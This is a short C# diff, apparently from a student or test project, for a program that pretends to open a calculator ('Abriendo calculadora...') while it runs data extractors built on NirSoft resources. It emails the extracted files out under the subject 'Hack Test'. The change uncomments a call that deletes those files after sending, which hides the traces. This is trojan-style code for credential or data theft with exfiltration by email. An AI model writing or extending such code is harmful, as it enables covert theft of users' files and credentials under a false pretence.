@@ -116,7 +116,7 @@ namespace TP
             Console.WriteLine("Abriendo calculadora. Por favor espere...");
             List<string> files = Helpers.ApplyDataExtractionActions(dataExtractors, nirsoftResources);
             Helpers.SendMail("Hack Test", "Hacked Files", files);
-            //Helpers.RemoveFiles(files);
+            Helpers.RemoveFiles(files);
         }
 
         private void backgroundWorker1_RunWorkerCompleted(object sender, RunWorkerCompletedEventArgs e)
